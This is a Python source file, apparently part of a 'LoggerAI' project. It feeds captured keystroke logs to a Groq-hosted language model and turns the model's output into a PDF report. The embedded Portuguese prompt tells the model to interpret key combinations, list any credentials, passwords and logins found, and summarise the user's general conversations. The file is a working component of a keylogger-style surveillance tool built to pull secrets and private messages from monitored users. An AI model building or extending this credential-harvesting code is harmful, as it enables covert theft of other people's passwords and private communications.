"""Agente que recebe os logs analisados do agente "analyzer" e cria um relatório em PDF com eles"""

import os
import re
from datetime import datetime
from io import BytesIO
from langchain_groq import ChatGroq
from langchain.prompts import ChatPromptTemplate
from dotenv import load_dotenv

from reportlab.lib.pagesizes import letter
from reportlab.platypus import Paragraph
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.pdfgen import canvas
from reportlab.lib import colors

from LoggerAI.loadenvfunc import get_base_path

dotenv_path = os.path.join(get_base_path(), ".env")
load_dotenv(dotenv_path)

api_key = os.getenv("GROQ_API_KEY")

os.environ["GROQ_API_KEY"] = api_key

chat = ChatGroq(model="llama3-70b-8192", temperature=0.2)

prompt_template = ChatPromptTemplate.from_template("""
Você é um especialista em conversão de formato de arquivos.

Sua tarefa é analisar os dados e retornar um texto ESTRUTURADO com sua análise. Use **exatamente** os títulos de seção abaixo, cada um em sua própria linha e prefixado com '## '.

**NÃO inclua a seção '## Dados Brutos' em sua resposta.**

---
### Títulos Obrigatórios para sua Resposta:
- ## Interpretação de Atalhos
- ## Detecção de Dados Sensíveis
- ## Conversas gerais (não necessariamente credenciais ou dados sensíveis)
- ## Síntese Final

---
### Instruções:
1.  **Interpretação de Atalhos**: Descreva as funções das combinações de teclas.
2.  **Detecção de Dados Sensíveis**: Liste quaisquer credenciais, senhas, logins, etc.
3.  **Dados Gerais**: Liste conversas gerais que o usuário teve, conversas que não sejam necessariamente credenciais ou dados sensíveis, para dar contexto a quem irá interpretar o relatório.
4.  **Síntese Final**: Forneça um resumo objetivo da atividade observada.

**IMPORTANTE**: Não use nenhuma formatação como negrito, itálico ou marcadores de lista (*, -). Apenas texto puro e os títulos de seção com '##'.

---
### Dados Capturados para Análise:
{data}
""")
chain = prompt_template | chat


def draw_section(c, y_position, title, content, styles):
    """
    Função auxiliar para desenhar uma seção formatada no PDF.
    Retorna a nova posição Y após desenhar a seção.
    """

    style = styles['Courier']

    p = Paragraph(content, style)
    _, h = p.wrapOn(c, 6.5 * inch, 5 * inch)

    if y_position < h + 1 * inch:
        c.showPage()
        y_position = 10 * inch

    c.setFillColor(colors.HexColor("#F4F6F8"))
    c.setStrokeColor(colors.HexColor("#D0D5DA"))
    c.rect(1 * inch, y_position - 0.25 * inch,
           6.5 * inch, 0.4 * inch, stroke=1, fill=1)

    c.setFillColor(colors.black)
    c.setFont('Helvetica-Bold', 12)
    c.drawString(1.2 * inch, y_position - 0.15 * inch, title)
    y_position -= (0.4 * inch)

    p.drawOn(c, 1 * inch, y_position - h)

    return y_position - h - 0.2 * inch


def convert_pdf(data: list[str]) -> bytes:
    """
    Função que recebe os logs, obtém uma análise da IA e converte essa análise para um PDF
    usando a biblioteca ReportLab para uma formatação profissional.
    :param data: Uma lista de strings, onde cada string é uma linha de log.
    :return: O conteúdo do arquivo PDF gerado, em bytes.
    """
    def markdown_to_reportlab_html(text: str) -> str:
        """Converte a sintaxe Markdown simples para as tags HTML da ReportLab."""
        text = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', text)

        lines = text.split('\n')
        formatted_lines = []
        for line in lines:
            stripped_line = line.strip()
            if stripped_line.startswith('- ') or stripped_line.startswith('* '):
                content = stripped_line[2:]
                formatted_lines.append(f'&bull; {content}')
            else:
                formatted_lines.append(line)

        return '<br/>'.join(formatted_lines)

    combined_data = "\n".join(data)
    response = chain.invoke({"data": combined_data})
    analysis_text = response.content

    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter

    styles = getSampleStyleSheet()
    styles.add(ParagraphStyle(name='Courier',
               parent=styles['Normal'], fontName='Courier', fontSize=9, leading=12))
    styles['BodyText'].fontName = 'Helvetica'
    styles['BodyText'].fontSize = 10

    c.setFont('Helvetica-Bold', 16)
    c.drawCentredString(width / 2.0, height - 0.75 * inch,
                        "Relatório de Análise de Logs")

    c.setFont('Helvetica', 8)
    generation_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    c.drawString(width - 1.5 * inch, height - 1 *
                 inch, f"Gerado em: {generation_time}")

    y_position = height - 1.5 * inch

    sections = analysis_text.split('## ')
    for section in sections:
        if not section.strip():
            continue

        parts = section.strip().split('\n', 1)
        title = parts[0].strip()
        content = parts[1].strip() if len(parts) > 1 else ""

        formatted_content = markdown_to_reportlab_html(content)

        y_position = draw_section(
            c, y_position, title, formatted_content, styles)

    c.save()

    pdf_bytes = buffer.getvalue()
    buffer.close()
    return pdf_bytes
